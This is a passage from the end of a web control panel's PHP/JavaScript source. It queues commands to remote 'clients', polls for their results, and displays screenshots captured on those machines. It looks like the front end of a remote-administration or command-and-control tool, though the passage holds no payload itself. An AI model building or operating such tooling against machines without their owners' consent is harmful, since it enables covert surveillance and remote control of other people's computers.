        }
        
        // Poll for command result
        function pollForResult(commandId, resultBox, attempts = 0) {
            if(attempts >= 30) { // Stop after 30 attempts (60 seconds)
                if(resultBox) {
                    resultBox.innerHTML = '<div style="color: #ffd93d;">⏱️ Timeout: Client did not respond within 60 seconds.</div><div style="color: #aaa; margin-top: 10px;">Check if client is online or try again.</div>';
                }
                return;
            }
            
            fetch('control_panel.php?client_id=<?= $client_id ?>&get_result=' + commandId)
            .then(response => response.json())
            .then(data => {
                if(data.status === 'completed' && data.result) {
                    // Result received!
                    if(resultBox) {
                        // Format the result nicely
                        let formattedResult = data.result;
                        
                        // Handle screenshots specially
                        if(formattedResult.startsWith('SCREENSHOT:')) {
                            const base64Data = formattedResult.substring(11);
                            formattedResult = '<div style="margin-bottom: 10px; color: #51cf66;">✓ Screenshot captured successfully!</div>' +
                                            '<img src="data:image/jpeg;base64,' + base64Data + '" ' +
                                            'style="max-width: 100%; border-radius: 5px; cursor: pointer;" ' +
                                            'onclick="window.open(this.src, \'_blank\')" alt="Screenshot">' +
                                            '<div style="color: #aaa; font-size: 0.9em; margin-top: 10px;">📌 Click to open full size | Right-click to save</div>';
                        } else {
                            formattedResult = '<div style="color: #51cf66; margin-bottom: 10px;">✓ Result received:</div>' +
                                            '<pre style="background: #0a0e27; padding: 10px; border-radius: 3px; white-space: pre-wrap; word-wrap: break-word; margin: 0;">' + 
                                            escapeHtml(formattedResult) + '</pre>';
                        }
                        
                        resultBox.innerHTML = formattedResult;
                    }
                    showNotification('✓ Result received!', 'success');
                } else if(data.status === 'failed') {
                    if(resultBox) {
                        resultBox.innerHTML = '<div style="color: #ff6b6b;">✗ Command failed: ' + escapeHtml(data.result || 'Unknown error') + '</div>';
                    }
                    showNotification('✗ Command failed', 'error');
                } else {
                    // Still pending, check again in 2 seconds
                    setTimeout(() => pollForResult(commandId, resultBox, attempts + 1), 2000);
                    
                    if(resultBox && attempts % 5 === 0) { // Update every 10 seconds
                        resultBox.innerHTML = '<div style="color: #51cf66;">✓ Command sent. Still waiting for client... (' + (attempts * 2) + 's)</div>';
                    }
                }
            })
            .catch(error => {
                console.error('Poll error:', error);
                // Retry on error
                setTimeout(() => pollForResult(commandId, resultBox, attempts + 1), 2000);
            });
        }
        
        // Helper to escape HTML
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        // Take screenshot function
        function takeScreenshot() {
            sendCommand('screenshot', '');
        }
        
        // Confirm dangerous action
        function confirmAction(commandType, commandData, message) {
            if(confirm(message)) {
                sendCommand(commandType, commandData);
            }
        }
        
        // Show notification
        function showNotification(message, type) {
            const notif = document.getElementById('notification');
            notif.textContent = message;
            notif.className = type === 'error' ? 'notification error' : 'notification';
            notif.style.display = 'block';
            
            setTimeout(() => {
                notif.style.display = 'none';
            }, 4000);
        }
    </script>
</body>
</html>
